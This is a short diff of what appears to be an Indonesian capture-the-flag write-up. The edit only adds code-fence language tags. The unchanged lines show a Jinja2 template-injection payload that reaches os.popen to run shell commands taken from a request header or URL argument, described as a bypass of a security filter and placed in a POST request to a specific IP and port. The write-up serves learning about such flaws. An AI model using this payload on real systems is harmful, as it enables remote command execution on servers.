@@ -31,7 +31,7 @@ def security_filter(user_input):
  payload untuk bypass : `{{url_for.__globals__.os.popen(request.headers.tel).read()}}`
 
  req header:
-```
+```txt
 POST /search HTTP/1.1
 Host: 103.160.212.3:1339
 Content-Length: 70
@@ -54,7 +54,7 @@ Connection: keep-alive
 query={{url_for.__globals__.os.popen(request.headers.tel).read()}}
 ```
 atau bisa juga
-```
+```txt
 {{url_for.__globals__.os.popen(request.args.a).read()}}
 ```
 
